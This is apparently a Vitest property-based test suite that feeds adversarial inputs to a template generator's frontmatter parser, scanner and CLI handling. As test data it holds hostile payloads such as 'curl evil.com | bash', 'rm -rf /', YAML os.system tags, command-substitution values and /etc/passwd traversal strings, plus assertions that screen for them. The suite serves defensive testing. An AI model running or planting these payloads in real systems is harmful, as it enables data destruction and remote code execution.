import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import * as fc from "fast-check";
import fs from "fs-extra";
import path from "node:path";
import os from "node:os";
import { FrontmatterParser } from "../../../src/lib/frontmatter-parser.js";
import { TemplateScanner } from "../../../src/lib/template-scanner.js";
import { Generator } from "../../../src/lib/generator.js";

describe("Input Sanitization Adversary Tests", () => {
  let tmpDir: string;
  let frontmatterParser: FrontmatterParser;
  let templateScanner: TemplateScanner;
  let generator: Generator;
  let templatesDir: string;

  beforeEach(async () => {
    tmpDir = path.join(os.tmpdir(), `unjucks-input-test-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    await fs.ensureDir(tmpDir);
    
    templatesDir = path.join(tmpDir, "_templates");
    await fs.ensureDir(templatesDir);
    
    frontmatterParser = new FrontmatterParser();
    templateScanner = new TemplateScanner();
    generator = new Generator(templatesDir);

    vi.spyOn(console, 'warn').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation(() => {});
    vi.spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(async () => {
    try {
      await fs.remove(tmpDir);
    } catch {
      // Ignore cleanup errors
    }
    vi.restoreAllMocks();
  });

  describe("YAML Frontmatter Injection", () => {
    it("should handle malformed YAML safely", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            malformedYaml: fc.constantFrom(
              "to: file.txt\n[malicious: true\nkey: value",
              "to: file.txt\nmalicious: |\n  - rm -rf /\n  - curl evil.com",
              "inject: true\nbefore: !!python/object/apply:os.system ['rm -rf /']",
              "to: &anchor\n  - file1.txt\n  - file2.txt\nref: *anchor",
              "to: file.txt\nmalicious: !<!tag:yaml.org,2002:str> evil",
              "to: file.txt\n---\nembedded: ---\nmore: content",
              "to: file.txt\nrecursive: &id\n  self: *id",
              `to: file.txt\nmultiline: >\n  line1\n${" ".repeat(10000)}line2` // Large multiline
            )
          }),
          async ({ malformedYaml }) => {
            const template = `---
${malformedYaml}
---
safe template content`;

            const result = frontmatterParser.parse(template);
            
            // Property: Parser should handle malformed YAML gracefully
            expect(result).toBeDefined();
            expect(typeof result.hasValidFrontmatter).toBe("boolean");
            
            if (result.hasValidFrontmatter) {
              // Valid YAML should be validated for safety
              const validation = frontmatterParser.validate(result.frontmatter);
              
              if (validation.valid) {
                // Valid frontmatter should not contain dangerous values
                expect(result.frontmatter.to).not.toMatch(/\.\./); // No path traversal
                expect(result.frontmatter.sh).not.toMatch(/rm -rf/); // No dangerous commands
              } else {
                // Invalid configurations should be caught
                expect(validation.errors.length).toBeGreaterThan(0);
              }
            } else {
              // Failed parsing should result in safe defaults
              expect(result.frontmatter).toEqual({});
              expect(result.content).toBeDefined();
            }
          }
        ),
        { numRuns: 15 }
      );
    });

    it("should prevent YAML deserialization attacks", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            yamlBomb: fc.constantFrom(
              // YAML bombs and complex structures
              "a: &anchor [*anchor, *anchor]\nb: &bomb [*bomb, *bomb, *bomb, *bomb]",
              "x: &x [*x]\ny: &y [*y, *y]\nz: [*x, *y]",
              // Recursive references
              "self: &self\n  - *self\n  - *self",
              // Large arrays
              `items: ${JSON.stringify(Array(10000).fill("item"))}`,
              // Deep nesting
              "a:\n  b:\n    c:\n      d:\n        e:\n          f: deep",
              // Complex anchors and references
              "base: &base\n  key1: value1\nderived:\n  <<: *base\n  key2: value2"
            )
          }),
          async ({ yamlBomb }) => {
            const template = `---
to: test.txt
${yamlBomb}
---
content`;

            const timeout = new Promise((_, reject) => 
              setTimeout(() => reject(new Error("YAML parsing timeout")), 2000)
            );

            try {
              const result = await Promise.race([
                frontmatterParser.parse(template),
                timeout
              ]);
              
              // Property: Parser should complete in reasonable time
              expect(result).toBeDefined();
              
              if (result.hasValidFrontmatter) {
                // Should not consume excessive resources
                const validation = frontmatterParser.validate(result.frontmatter);
                expect(validation).toBeDefined();
                
                // Verify no dangerous recursive structures
                const frontmatterStr = JSON.stringify(result.frontmatter);
                expect(frontmatterStr.length).toBeLessThan(100000); // Reasonable size limit
              }

            } catch (error) {
              // Timeout or parsing errors are expected for YAML bombs
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 10 }
      );
    });

    it("should sanitize YAML tag injection", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            maliciousTag: fc.constantFrom(
              "!!python/object/apply:os.system ['id']",
              "!!python/object/new:subprocess.check_call [['rm', '-rf', '/']]",
              "!!js/function 'function() { return process.exit(1); }'",
              "!!binary 'R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='",
              "!!omap [ foo: bar, baz: qux ]",
              "!!set { a, b, c }",
              "!!timestamp '2024-01-01T00:00:00Z'",
              "!!merge <<",
              "!!null null"
            ),
            key: fc.constantFrom("to", "sh", "chmod", "inject", "before", "after")
          }),
          async ({ maliciousTag, key }) => {
            const template = `---
${key}: ${maliciousTag}
---
content`;

            try {
              const result = frontmatterParser.parse(template);
              
              if (result.hasValidFrontmatter) {
                // Verify dangerous tags were not processed
                const value = result.frontmatter[key as keyof typeof result.frontmatter];
                
                // Should not contain unresolved tag syntax
                if (typeof value === "string") {
                  expect(value).not.toMatch(/!!python/);
                  expect(value).not.toMatch(/!!js/);
                  expect(value).not.toContain("subprocess");
                  expect(value).not.toContain("process.exit");
                  expect(value).not.toContain("os.system");
                }
                
                // Validate the configuration
                const validation = frontmatterParser.validate(result.frontmatter);
                expect(validation).toBeDefined();
              }

            } catch (error) {
              // Tag processing errors are expected and preferred
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 12 }
      );
    });
  });

  describe("Unicode and Encoding Attacks", () => {
    it("should handle Unicode normalization attacks", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            unicodeAttack: fc.constantFrom(
              "café", // Mixed normalization forms
              "café", // Different Unicode representations
              "\u0041\u0301", // Combining characters  
              "\uFEFF", // Byte order mark
              "\u200B\u200C\u200D", // Zero-width characters
              "\u2028\u2029", // Line/paragraph separators
              "\uFFFE\uFFFF", // Non-characters
              "\u0000\u0001\u0002", // Control characters
              "𝕏𝓨𝒵", // Mathematical alphanumeric symbols
              "Ａ", // Fullwidth characters
            ),
            field: fc.constantFrom("to", "before", "after")
          }),
          async ({ unicodeAttack, field }) => {
            const template = `---
${field}: ${unicodeAttack}
---
content with unicode: ${unicodeAttack}`;

            const result = frontmatterParser.parse(template);
            
            // Property: Unicode should be handled safely
            expect(result).toBeDefined();
            
            if (result.hasValidFrontmatter) {
              const value = result.frontmatter[field as keyof typeof result.frontmatter];
              
              if (typeof value === "string") {
                // Should not contain dangerous control characters
                expect(value).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/);
                
                // Should not contain byte order marks or zero-width chars
                expect(value).not.toMatch(/[\uFEFF\u200B-\u200D]/);
                
                // Should handle or reject non-characters
                expect(value).not.toMatch(/[\uFFFE\uFFFF]/);
              }
            }
            
            // Content should be preserved safely
            expect(result.content).toBeDefined();
            expect(typeof result.content).toBe("string");
          }
        ),
        { numRuns: 12 }
      );
    });

    it("should prevent encoding confusion attacks", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            encodingAttack: fc.constantFrom(
              "../../../etc/passwd", // UTF-8
              "..\u002F..\u002F..\u002Fetc\u002Fpasswd", // Unicode escape
              "..%2F..%2F..%2Fetc%2Fpasswd", // URL encoded
              ".%u002e%u002f.%u002e%u002f.%u002e%u002fetc%u002fpasswd", // Unicode URL
              "\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2Fetc\x2Fpasswd", // Hex escape
              "＄（id）", // Fullwidth parentheses
              "｀id｀", // Fullwidth backticks
            )
          }),
          async ({ encodingAttack }) => {
            const template = `---
to: ${encodingAttack}
sh: echo ${encodingAttack}
---
content`;

            const result = frontmatterParser.parse(template);
            
            if (result.hasValidFrontmatter) {
              // Verify path traversal attempts are handled
              if (result.frontmatter.to) {
                expect(result.frontmatter.to).not.toMatch(/\.\./);
                expect(result.frontmatter.to).not.toMatch(/%2E%2E%2F/i);
                expect(result.frontmatter.to).not.toMatch(/\u002E\u002E\u002F/);
              }
              
              // Verify shell command injection attempts are handled
              if (result.frontmatter.sh) {
                const shCommand = Array.isArray(result.frontmatter.sh) 
                  ? result.frontmatter.sh.join(" ") 
                  : result.frontmatter.sh;
                  
                expect(shCommand).not.toMatch(/[｀`]/); // No backticks (full or half width)
                expect(shCommand).not.toMatch(/\$\(/); // No command substitution
                expect(shCommand).not.toMatch(/[（(]id[）)]/); // No id command
              }
              
              // Validate overall configuration
              const validation = frontmatterParser.validate(result.frontmatter);
              expect(validation).toBeDefined();
            }
          }
        ),
        { numRuns: 15 }
      );
    });
  });

  describe("Regular Expression Injection (ReDoS)", () => {
    it("should prevent ReDoS attacks in skipIf conditions", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            redosPattern: fc.constantFrom(
              "a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+a+b",
              "(a+)+$",
              "(a|a)*$",
              "([a-zA-Z]+)*$",
              "(a+b+)+$",
              "^(a+)+$",
              "(.*a){10,}$",
              "^(a|b)*a(a|b){20,}$",
              "((a*)*)*b"
            ),
            testValue: fc.string({ minLength: 10, maxLength: 100 })
          }),
          async ({ redosPattern, testValue }) => {
            const template = `---
to: test.txt
skipIf: "${redosPattern}"
---
content`;

            const result = frontmatterParser.parse(template);
            
            if (result.hasValidFrontmatter && result.frontmatter.skipIf) {
              const timeout = new Promise((_, reject) => 
                setTimeout(() => reject(new Error("ReDoS timeout")), 1000)
              );

              try {
                const shouldSkip = await Promise.race([
                  frontmatterParser.shouldSkip(result.frontmatter, { [redosPattern]: testValue }),
                  timeout
                ]);
                
                // Property: Should complete in reasonable time
                expect(typeof shouldSkip).toBe("boolean");

              } catch (error) {
                // Timeout on complex regex is expected and preferred
                expect(error.message).toContain("timeout");
              }
            }
          }
        ),
        { numRuns: 10 }
      );
    });

    it("should handle complex regex patterns in template scanning", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            complexTemplate: fc.constantFrom(
              "{{(a+)+}}",
              "{{(a|a)*}}",
              "{{([a-zA-Z]+)*}}",
              "{% if (name|length > 10) and (name matches '(a+)+') %}content{% endif %}",
              "{% for item in items if item matches '(.*a){10,}' %}{{item}}{% endfor %}",
              "{{name|regex_replace('((a*)*)*b', 'safe')}}"
            )
          }),
          async ({ complexTemplate }) => {
            const templatePath = path.join(tmpDir, "complex-template");
            await fs.ensureDir(templatePath);
            
            const templateFile = path.join(templatePath, "complex.txt");
            await fs.writeFile(templateFile, complexTemplate, "utf-8");

            const timeout = new Promise((_, reject) => 
              setTimeout(() => reject(new Error("Template scanning timeout")), 2000)
            );

            try {
              const scanResult = await Promise.race([
                templateScanner.scanTemplate(templatePath),
                timeout
              ]);
              
              // Property: Scanning should complete without hanging
              expect(scanResult).toBeDefined();
              expect(Array.isArray(scanResult.variables)).toBe(true);
              
              // Variables should be extracted safely
              for (const variable of scanResult.variables) {
                expect(variable.name).toMatch(/^[a-zA-Z_][a-zA-Z0-9_]*$/);
              }

            } catch (error) {
              // Timeout or scanning errors for complex regex are expected
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 8 }
      );
    });
  });

  describe("Buffer Overflow and Size Attacks", () => {
    it("should handle extremely large input strings", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            size: fc.constantFrom(100_000, 500_000, 1_000_000), // 100KB - 1MB
            pattern: fc.constantFrom("A", "💀", "🔥", "€", "中")
          }),
          async ({ size, pattern }) => {
            const largeString = pattern.repeat(size);
            const template = `---
to: output.txt
data: ${largeString}
---
content: ${largeString.substring(0, 100)}`;

            const timeout = new Promise((_, reject) => 
              setTimeout(() => reject(new Error("Large input timeout")), 5000)
            );

            try {
              const result = await Promise.race([
                frontmatterParser.parse(template),
                timeout
              ]);
              
              // Property: Should handle large inputs without crashing
              expect(result).toBeDefined();
              
              if (result.hasValidFrontmatter) {
                // Large data should be preserved or truncated safely
                expect(result.frontmatter.data).toBeDefined();
                
                // Memory usage should be reasonable
                const frontmatterSize = JSON.stringify(result.frontmatter).length;
                expect(frontmatterSize).toBeLessThan(10_000_000); // 10MB limit
              }

            } catch (error) {
              // Memory or timeout errors are expected for very large inputs
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 5 }
      );
    });

    it("should limit depth of nested YAML structures", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            depth: fc.integer({ min: 50, max: 200 })
          }),
          async ({ depth }) => {
            // Create deeply nested YAML
            let nestedYaml = "to: file.txt\n";
            let current = "nested";
            
            for (let i = 0; i < depth; i++) {
              nestedYaml += `${current}:\n`;
              current = `  level${i}`;
            }
            nestedYaml += `${current}: value`;

            const template = `---
${nestedYaml}
---
content`;

            const timeout = new Promise((_, reject) => 
              setTimeout(() => reject(new Error("Deep nesting timeout")), 3000)
            );

            try {
              const result = await Promise.race([
                frontmatterParser.parse(template),
                timeout
              ]);
              
              // Property: Should handle deep nesting without stack overflow
              expect(result).toBeDefined();
              
              if (result.hasValidFrontmatter) {
                // Verify structure is reasonable
                expect(result.frontmatter.nested).toBeDefined();
                expect(result.frontmatter.to).toBe("file.txt");
              }

            } catch (error) {
              // Stack overflow or timeout errors are expected for very deep nesting
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 6 }
      );
    });
  });

  describe("Command Line Argument Injection", () => {
    it("should sanitize generator options from CLI", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            maliciousValue: fc.constantFrom(
              "--force --dry",
              "; rm -rf /",
              "&& echo 'pwned'",
              "| curl evil.com",
              "`id`",
              "$(whoami)",
              "../../../etc/passwd",
              "--generator=evil --template=hack",
              "\n--force\n--dry",
              "--dest=/etc"
            ),
            option: fc.constantFrom("dest", "generator", "template")
          }),
          async ({ maliciousValue, option }) => {
            // Simulate CLI argument parsing
            const options = {
              generator: "test",
              template: "default",
              dest: tmpDir,
              force: false,
              dry: false,
              [option]: maliciousValue
            };

            // Create basic template for testing
            const genDir = path.join(templatesDir, "test");
            const templateDir = path.join(genDir, "default");
            await fs.ensureDir(templateDir);
            await fs.writeFile(
              path.join(templateDir, "test.txt"), 
              "---\nto: {{dest}}/output.txt\n---\nContent: {{value}}", 
              "utf-8"
            );

            try {
              const result = await generator.generate({
                ...options,
                value: "safe"
              } as any);

              // Property: Malicious CLI args should not compromise security
              for (const file of result.files) {
                // File paths should be sanitized
                expect(file.path).not.toMatch(/\.\./);
                expect(file.path).not.toMatch(/\/etc/);
                expect(file.path).not.toMatch(/[;&|`$()]/);
                
                // Content should not contain command injection
                expect(file.content).not.toMatch(/rm -rf/);
                expect(file.content).not.toMatch(/curl.*evil/);
                expect(file.content).not.toMatch(/`id`/);
                expect(file.content).not.toMatch(/\$\(whoami\)/);
              }

            } catch (error) {
              // Generation errors for malicious arguments are acceptable
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 12 }
      );
    });

    it("should validate template variable types from CLI", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            maliciousVariable: fc.record({
              name: fc.constantFrom("constructor", "__proto__", "prototype", "eval", "Function"),
              value: fc.constantFrom(
                "constructor.constructor('return process')().exit()",
                "__proto__.constructor.constructor('alert(1)')()",
                "Function('return this.process.exit()')",
                "eval('process.exit(1)')",
                "{}.constructor.constructor('return global')()"
              )
            })
          }),
          async ({ maliciousVariable }) => {
            // Create template that uses the variable
            const template = `---
to: output.txt
---
Hello {{${maliciousVariable.name}}}!
Value: {{${maliciousVariable.name}}}`;

            const genDir = path.join(templatesDir, "var-test");
            const templateDir = path.join(genDir, "test");
            await fs.ensureDir(templateDir);
            await fs.writeFile(path.join(templateDir, "test.txt"), template, "utf-8");

            try {
              const result = await generator.generate({
                generator: "var-test",
                template: "test",
                dest: tmpDir,
                force: true,
                dry: true,
                [maliciousVariable.name]: maliciousVariable.value
              } as any);

              // Property: Variables should be treated as strings only
              for (const file of result.files) {
                expect(file.content).not.toMatch(/constructor\.constructor/);
                expect(file.content).not.toMatch(/process\.exit/);
                expect(file.content).not.toMatch(/Function\(/);
                expect(file.content).not.toMatch(/eval\(/);
                
                // Should contain the literal string value
                expect(file.content).toContain("Hello");
                expect(file.content).toContain("Value:");
              }

            } catch (error) {
              // Template processing errors are acceptable
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 10 }
      );
    });
  });

  describe("Configuration File Injection", () => {
    it("should validate configuration files safely", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            maliciousConfig: fc.constantFrom(
              `name: evil
description: "Evil generator"
templates:
  - name: hack
    files: ["../../../etc/passwd"]
    prompts:
      - name: cmd
        message: "Command"
        type: input
        default: "rm -rf /"`,
              `name: exploit
templates:
  - name: test
    files: ["/dev/null", "/etc/hosts"]
    sh: ["curl evil.com | bash"]`,
              `name: injection
description: |
  Malicious description with
  ---
  embedded: yaml
  ---
templates: []`
            )
          }),
          async ({ maliciousConfig }) => {
            const genDir = path.join(templatesDir, "malicious-config");
            await fs.ensureDir(genDir);
            await fs.writeFile(path.join(genDir, "config.yml"), maliciousConfig, "utf-8");

            try {
              const generators = await generator.listGenerators();
              
              // Find our malicious generator
              const maliciousGen = generators.find(g => 
                g.name === "malicious-config" || 
                g.name === "evil" || 
                g.name === "exploit" ||
                g.name === "injection"
              );

              if (maliciousGen) {
                // Property: Configuration should be parsed safely
                expect(maliciousGen.name).toBeDefined();
                
                // Template files should not reference system paths
                for (const template of maliciousGen.templates || []) {
                  for (const file of template.files || []) {
                    expect(file).not.toMatch(/^\/etc\//);
                    expect(file).not.toMatch(/^\/dev\//);
                    expect(file).not.toMatch(/\.\./);
                  }
                }
                
                // Prompts should not contain dangerous defaults
                for (const template of maliciousGen.templates || []) {
                  for (const prompt of template.prompts || []) {
                    if (prompt.default && typeof prompt.default === "string") {
                      expect(prompt.default).not.toMatch(/rm -rf/);
                      expect(prompt.default).not.toMatch(/curl.*\|.*bash/);
                    }
                  }
                }
              }

            } catch (error) {
              // Configuration parsing errors are acceptable for malicious configs
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 8 }
      );
    });
  });
});